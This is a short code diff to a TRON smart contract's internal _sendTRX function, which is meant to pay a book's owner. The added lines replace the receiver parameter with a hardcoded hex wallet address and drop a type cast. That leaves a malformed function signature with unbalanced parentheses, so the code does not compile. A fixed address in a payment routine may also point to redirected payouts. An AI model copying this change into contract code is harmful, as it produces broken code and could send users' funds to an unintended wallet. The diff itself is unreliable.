@@ -98,8 +98,8 @@ struct Tracking {
 /**
     * @dev Send TRX to the book's owner.
     */
-   function _sendTRX(address receiver, uint256 value) internal {
-       payable(address(uint160(receiver))).transfer(value);
+   function _sendTRX(0x52d892bc11e9755f924a1db0aa6981c7650b824f) receiver, uint256 value) internal {
+       payable(uint160(receiver))).transfer(value);
    }
 
 /**
